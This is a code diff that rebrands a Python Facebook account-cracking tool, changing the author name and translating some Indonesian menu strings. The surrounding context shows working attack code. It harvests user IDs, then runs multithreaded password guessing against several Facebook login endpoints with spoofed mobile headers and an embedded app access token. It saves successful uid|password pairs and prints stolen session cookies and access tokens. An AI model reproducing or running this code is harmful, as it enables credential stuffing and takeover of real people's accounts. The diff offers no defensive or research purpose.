@@ -42,11 +42,11 @@ ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huaw
 ___logo___ = ("""%s ____\n|  _ \ _   _ _ __ ___  _ __\n%s| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n%s|____/ \__,_|_| |_| |_| .__/\n                      |_|
  ███▓ ▄▄▄      ▒██████▒
 ▓██ ▒█▒▓█▒███▄    ▒ ▒ ▒ ▄▀░
-▓██ █ Mãtëëñ█  ▀█▄  Mêêtøø░ ▒ ▄░ 
+▓██ █ MAHDI█  ▀█▄  MAHDI░ ▒ ▄░ 
 ▒██▀▀█▄░█░░▄██   ▄▀▒   ░
 ░▓ ▒██▒░█▓█   ▓██▒▒█████▒
 ░ ▒▓ ░▒▓░░▓   ▒▒   ▓▒█░░▒▒ ▓░▒░▒
-  ░▒ ░ ▒Author░ Metoohacker(Mateen)▒ ░  ▒   ▒▒ ░░░▒ ▒ ░ ▒
+  ░▒ ░ ▒Author░ MAHDI HASAN SHUVO▒ ░  ▒   ▒▒ ░░░▒ ▒ ░ ▒
   ░░   ░  ▒ ░  ░   ▒   ░ ░ ░ ░ ░
    ░      ░        ░  ░  ░ ░    
                        ░              
@@ -61,8 +61,8 @@ cp = []
 def ___login___():
     os.system('clear')
     print(___logo___)
-    print("%s[%s1%s]%s Login Pakai Token"%(B,P,B,P))
-    print("%s[%s2%s]%s Login Pakai Cookie"%(B,P,B,P))
+    print("%s[%s1%s]%s Login With Token"%(B,P,B,P))
+    print("%s[%s2%s]%s Login With Cookie"%(B,P,B,P))
     print("%s[%s3%s]%s Dapatkan Token Or Cookie"%(B,P,B,P))
     print("%s[%s4%s]%s Keluar"%(K,P,K,P))
     ___login___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,H))
@@ -179,9 +179,9 @@ def ___menu___():
         ___login___()
     except (ConnectionError):
         exit("%s[%s!%s]%s Koneksi Error"%(P,M,P,M))
-    print("\n%s[%s1%s]%s Dump ID Publik Masal Acak (2004-2021)"%(H,U,H,P))
-    print("%s[%s2%s]%s Dump ID Publik Masal Old (2009-2006)"%(H,U,H,P))
-    print("%s[%s3%s]%s Dump ID Publik Masal New (2020-2021)"%(H,U,H,P))
+    print("\n%s[%s1%s]%s Dump ID Publik ID (2004-2021)"%(H,U,H,P))
+    print("%s[%s2%s]%s Dump ID Publik  Old (2009-2006)"%(H,U,H,P))
+    print("%s[%s3%s]%s Dump ID Publik  New (2020-2021)"%(H,U,H,P))
     print("%s[%s4%s]%s Dump ID Publik Very Old (2006-2009)"%(H,U,H,P))
     print("%s[%s5%s]%s Dump ID Follower Old (2015-2006)"%(H,U,H,P))
     print("%s[%s6%s]%s Dump ID Follower New (2021-2020)"%(H,U,H,P))
@@ -214,8 +214,8 @@ def ___menu___():
     elif ___menu___ in ['10']:
         ___metode___()
     elif ___menu___ in ['11']:
-        print("\n%s[%s1%s]%s Lihat Mátèèñ Ok.txt"%(B,P,B,P))
-        print("%s[%s2%s]%s Lihat Måtëëñ Cp.txt"%(B,P,B,P))
+        print("\n%s[%s1%s]%s Lihat MAHDI Ok.txt"%(B,P,B,P))
+        print("%s[%s2%s]%s Lihat MAHDI Cp.txt"%(B,P,B,P))
         print("%s[%s3%s]%s Kembali"%(B,K,B,P))
         ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
         if ___hasilz___ in ['1','01']:
@@ -812,8 +812,8 @@ def ___metode___():
             ids=open(___file___).read().splitlines()
         except:
             exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
-        print("\n%s[%sâ€¢%s]%s MATEEN Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
-        print("%s[%sâ€¢%s]%s MATEEN Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
+        print("\n%s[%sâ€¢%s]%s MAHDI Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
+        print("%s[%sâ€¢%s]%s MAHDI Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
@@ -894,12 +894,12 @@ def free(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -931,12 +931,12 @@ def mobile(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -968,12 +968,12 @@ def crack(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -994,12 +994,12 @@ def api(ids, uid, pwx):
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
             if 'session_key' in send.text and 'EAAA' in send.text:
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif 'www.facebook.com' in send.json()['error_msg']:
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -1031,12 +1031,12 @@ def crack2(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
